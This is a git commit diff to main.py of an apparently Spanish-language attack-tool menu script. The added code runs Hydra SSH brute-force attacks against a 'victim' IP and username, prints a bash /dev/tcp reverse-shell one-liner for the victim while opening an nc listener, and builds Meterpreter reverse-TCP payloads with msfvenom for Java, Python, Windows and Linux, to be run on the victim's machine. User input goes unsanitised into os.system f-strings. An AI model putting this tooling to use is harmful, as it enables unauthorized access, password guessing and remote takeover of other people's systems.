d76643934fad429e362478f61c4d9fc50ebe8dd3
Zombie <158185295+ZombieGeeK0@users.noreply.github.com>
2024-02-01 20:19:38 +0100

    Update main.py

--- main.py
+++ main.py
@@ -14,6 +14,44 @@ CYAN = '\033[36m'
 WHITE = '\033[37m'
 RESET = '\033[39m'
 
+def hydra_attack():
+      options = '''
+[00]: Volver al menú.
+[01]: Salir.
+[02]: Ataque ssh.
+'''
+      print('\n' + options)
+      choice = input('[#]> ')
+
+      if choice == '00':
+            menu()
+
+      elif choice == '01':
+            print(Fore.RESET + Back.RESET)
+            os.system('clear')
+            sys.exit()
+      
+      elif choice == '02':
+            print('\n[#] El diccionario tiene que estar en tu directorio actual.')
+            print('[#] Ingresa la IP de la víctima.')
+            choice = input('[#]> ')
+            print('\n' + '[#] Ingresa el nombre de usuario de la víctima.')
+            choice2 = input('[#]> ')
+            print('\n' + '[#] Ingresa el nombre del diccionario.')
+            choice3 = input('[#]> ')
+            print('[#]> ------------------------------------------------------------------------- <[#]')
+            os.system(f'hydra -l {choice2} -P {choice3} -e nsr -t 8 ssh://{choice}/ -V -f')
+            print('[#]> ------------------------------------------------------------------------- <[#]')
+            print('\n[#] Presiona ENTER para volver al menú.')
+            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
+            menu()
+
+
+      else:
+            print('\n[#] Error: Command not found :(. Presiona ENTER para volver al menú.')
+            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
+            menu()
+
 def menu():
       os.system('clear')
       title = f'''
@@ -31,9 +69,9 @@ def menu():
             *,   (##%///#       [02]: Generar una wordlist con crunch (de palabras).                     
             *,   (##%//(#       [03]: Poner al día todos los paquetes.                          
             *,   ###%//(#       [04]: Hacerle un Whois a un dominio o a una IP.                          
-            *,  .#%#%//(#                                 
-            *,  .#%%%//(#                                 
-            *,  .#%%%//(#                                 
+            *,  .#%#%//(#       [05]: Crear una pequeña reverse shell con Bash para Linux                          
+            *,  .#%%%//(#       [06]: Generar payloads con msfvenom.                          
+            *,  .#%%%//(#       [07]: Realizar ataques con Hydra.                          
             *,  .#%%%//(#                                 
             *, ..#%%%//(#                                 
             *. ..#%%%/((#                                 
@@ -91,6 +129,33 @@ def menu():
             print('\n[#] Presiona ENTER para volver al menú.')
             choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
             menu()
+
+      elif choice == '05':
+            print('\n[#] Comando a ejecutar en la víctima: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
+            print('[#]> ------------------------------------------------------------------------- <[#]')
+            os.system('nc -lvp 8080')
+            print('[#]> ------------------------------------------------------------------------- <[#]')
+            print('\n[#] Presiona ENTER para volver al menú.')
+            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
+            menu()
+
+      elif choice == '06':
+            print('\n[#] Ingresa tu IP: ')
+            choice = input('[#]> ')
+            print('[#]> ------------------------------------------------------------------------- <[#]')
+            os.system(f'msfvenom -p java/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -f jar > payload_java.jar')
+            os.system(f'msfvenom -p python/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -o payload_python.py')
+            os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -o payload_windows.exe')
+            os.system(f'msfvenom -p linux/meterpreter/reverse_tcp LHOST={choice} LPORT=4444 -o payload_linux.exe')
+            print('[#]> ------------------------------------------------------------------------- <[#]')
+            print('[#] Ejecuta el archivo en la máquina víctima.')
+            os.system('nc -lvnp 4444')
+            print('\n[#] Presiona ENTER para volver al menú.')
+            choice = input(Fore.YELLOW + Back.RESET + '\n[#]> ')
+            menu()
+
+      elif choice == '07':
+            hydra_attack()
       
 
       else:
